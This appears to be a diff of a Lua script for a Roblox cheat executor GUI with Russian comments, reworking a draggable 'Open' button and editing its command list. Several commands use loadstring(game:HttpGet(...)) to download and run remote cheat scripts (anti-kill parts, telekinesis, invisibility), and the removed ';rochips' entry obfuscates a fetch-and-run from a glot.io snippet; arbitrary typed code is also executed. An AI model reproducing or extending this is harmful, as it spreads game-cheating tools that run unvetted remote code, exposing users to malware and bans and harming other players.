@@ -21,8 +21,6 @@ frame.BorderSizePixel = 0
 frame.Parent = screenGui
 frame.Visible = false
 frame.BackgroundTransparency = 1
-frame.Active = true
-frame.Draggable = true
 
 -- Генерация градиента для фона
 local gradientFrame = Instance.new("Frame")
@@ -145,6 +143,45 @@ openButton.TextSize = 30
 openButton.Parent = screenGui
 openButton.Visible = true
 
+-- Перетаскивание кнопки "Открыть"
+local openButtonDragging = false
+local openButtonDragInput, openButtonDragStart, openButtonStartPos
+
+local function startOpenButtonDrag(input)
+    openButtonDragging = true
+    openButtonDragStart = input.Position
+    openButtonStartPos = openButton.Position
+end
+
+local function dragOpenButtonMove(input)
+    if openButtonDragging then
+        local delta = input.Position - openButtonDragStart
+        openButton.Position = UDim2.new(openButtonStartPos.X.Scale, openButtonStartPos.X.Offset + delta.X, openButtonStartPos.Y.Scale, openButtonStartPos.Y.Offset + delta.Y)
+    end
+end
+
+local function endOpenButtonDrag(input)
+    openButtonDragging = false
+end
+
+openButton.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        startOpenButtonDrag(input)
+    end
+end)
+
+openButton.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragOpenButtonMove(input)
+    end
+end)
+
+openButton.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        endOpenButtonDrag(input)
+    end
+end)
+
 -- Генерируем градиент для кнопки "Открыть"
 local openButtonGradient = Instance.new("UIGradient")
 openButtonGradient.Color = ColorSequence.new({
@@ -168,9 +205,7 @@ local function scaleDown(frame, callback)
     tween:Play()
     tween.Completed:Wait()
     frame.Visible = false
-    if callback then
-        callback()
-    end
+    if callback then callback() end
 end
 
 -- Обновленный список команд
@@ -243,18 +278,6 @@ executeButton.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Anti-kill-parts-updated-/refs/heads/main/Anti%20kill%20parts%20by%20Zephyr"))()
     elseif codeToExecute == ";tel3" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sakupenXD/SakupScripts/main/Telekinesis", true))()
-    elseif codeToExecute == ";invis" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/community-Y-HUB/refs/heads/main/invisible-button"))()
-    elseif codeToExecute == ";prox" then
-        for i,v in ipairs(game:GetService("Workspace"):GetDescendants()) do
-            if v.ClassName == "ProximityPrompt" then
-                v.HoldDuration = 0
-            end
-        end
-    elseif codeToExecute == ";invis2" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudHub111/Scripts/refs/heads/main/Fe%20Invisible%20Beta", Beta))()
-    elseif codeToExecute == ";rochips" then
-        if "you wanna use rochips universal" then 	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/" 	local im,lonely,z_c=task.wait,game,loadstring 	z_c(lonely:HttpGet(z_z..""..z_x))() 	return ("This will load in about 2 - 30 seconds" or "according to your device and executor") end 
     else
         local success, errorMessage = pcall(function()
             loadstring(codeToExecute)()
@@ -301,35 +324,6 @@ end)
 openButton.MouseButton1Click:Connect(function()
     scaleUp(frame)
     openButton.Visible = false -- Скрываем кнопку "Открыть"
-end)
-
--- Перетаскивание кнопки "Открыть"
-local openButtonDragging = false
-local mousePos, openButtonPos
-
-openButton.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        openButtonDragging = true
-        mousePos = input.Position
-        openButtonPos = openButton.Position
-
-        -- Блокируем управление камерой
-        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
-
-        UserInputService.InputChanged:Connect(function(change)
-            if openButtonDragging and (change.UserInputType == Enum.UserInputType.MouseMovement or change.UserInputType == Enum.UserInputType.Touch) then
-                local delta = change.Position - mousePos
-                openButton.Position = UDim2.new(openButtonPos.X.Scale, openButtonPos.X.Offset + delta.X, openButtonPos.Y.Scale, openButtonPos.Y.Offset + delta.Y)
-            end
-        end)
-    end
-end)
-
-UserInputService.InputEnded:Connect(function(input)
-    if openButtonDragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
-        openButtonDragging = false -- Восстанавливаем управление камерой
-        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
-    end
 end)
 
 -- Восстанавливаем тип камеры при закрытии интерфейса
